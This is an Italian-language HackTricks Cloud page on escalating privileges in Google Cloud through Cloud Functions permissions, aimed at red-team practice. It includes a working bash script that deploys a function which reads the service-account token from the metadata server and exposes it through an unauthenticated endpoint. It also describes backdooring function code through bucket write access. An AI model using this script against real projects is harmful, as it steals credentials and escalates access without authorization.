# GCP - Cloudfunctions Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## cloudfunctions

Maggiore informazione su Cloud Functions:

{% content-ref url="../gcp-services/gcp-cloud-functions-enum.md" %}
[gcp-cloud-functions-enum.md](../gcp-services/gcp-cloud-functions-enum.md)
{% endcontent-ref %}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Un attaccante con questi privilegi pu√≤ **creare una nuova Cloud Function con codice arbitrario (maligno) e assegnargli un Service Account**. Poi, leakare il token del Service Account dai metadati per elevare i privilegi.\
Alcuni privilegi per attivare la funzione potrebbero essere richiesti.

Gli script di exploit per questo metodo possono essere trovati [qui](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) e [qui](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) e il file .zip precompilato pu√≤ essere trovato [qui](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions).

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Un attaccante con questi privilegi pu√≤ **modificare il codice di una Function e persino modificare il service account associato** con l'obiettivo di esfiltrare il token.

{% hint style="danger" %}
Per distribuire le cloud functions avrai anche bisogno di permessi actAs sul service account di calcolo predefinito o sul service account utilizzato per costruire l'immagine.
{% endhint %}

Alcuni privilegi extra come il permesso `.call` per la versione 1 di cloudfunctions o il ruolo `role/run.invoker` per attivare la funzione potrebbero essere richiesti.
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
{% hint style="danger" %}
Se ricevi l'errore `Permission 'run.services.setIamPolicy' denied on resource...` √® perch√© stai usando il parametro `--allow-unauthenticated` e non hai abbastanza permessi per farlo.
{% endhint %}

Lo script di exploit per questo metodo pu√≤ essere trovato [qui](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py).

### `cloudfunctions.functions.sourceCodeSet`

Con questo permesso puoi ottenere un **URL firmato per poter caricare un file in un bucket di funzioni (ma il codice della funzione non verr√† modificato, devi comunque aggiornarlo)**

{% code overflow="wrap" %}
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
{% endcode %}

Non sono davvero sicuro di quanto sia utile solo questo permesso dal punto di vista di un attaccante, ma √® buono da sapere.

### `cloudfunctions.functions.setIamPolicy`, `iam.serviceAccounts.actAs`

Dati a te stesso uno dei precedenti privilegi **`.update`** o **`.create`** per l'escalation.

### `cloudfunctions.functions.update`

Avere solo permessi **`cloudfunctions`**, senza **`iam.serviceAccounts.actAs`**, non ti permetter√† di aggiornare la funzione QUINDI QUESTO NON √à UN VALIDO PRIVESC. 

### Accesso in lettura e scrittura sul bucket

Se hai accesso in lettura e scrittura sul bucket, puoi monitorare le modifiche nel codice e ogni volta che **si verifica un aggiornamento nel bucket, puoi aggiornare il nuovo codice con il tuo codice** in modo che la nuova versione della Cloud Function venga eseguita con il codice backdoored inviato.

Puoi controllare di pi√π sull'attacco in:

{% content-ref url="gcp-storage-privesc.md" %}
[gcp-storage-privesc.md](gcp-storage-privesc.md)
{% endcontent-ref %}

Tuttavia, non puoi usare questo per pre-compromettere le Cloud Functions di terze parti perch√© se crei il bucket nel tuo account e gli dai permessi pubblici affinch√© il progetto esterno possa scriverci sopra, ottieni il seguente errore:

<figure><img src="../../../.gitbook/assets/image (1).png" alt="" width="304"><figcaption></figcaption></figure>

{% hint style="danger" %}
Tuttavia, questo potrebbe essere usato per attacchi DoS.
{% endhint %}

### Accesso in lettura e scrittura su Artifact Registry

Quando viene creata una Cloud Function, una nuova immagine docker viene inviata all'Artifact Registry del progetto. Ho provato a modificare l'immagine con una nuova e persino a eliminare l'immagine corrente (e l'immagine `cache`), ma nulla √® cambiato, la cloud function continua a funzionare. Pertanto, potrebbe **essere possibile abusare di un attacco di Race Condition** come con il bucket per cambiare il contenitore docker che verr√† eseguito, ma **modificare semplicemente l'immagine memorizzata non √® possibile per compromettere la Cloud Function**.

## Riferimenti

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{% hint style="success" %}
Impara e pratica il hacking AWS:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Impara e pratica il hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
{% endhint %}
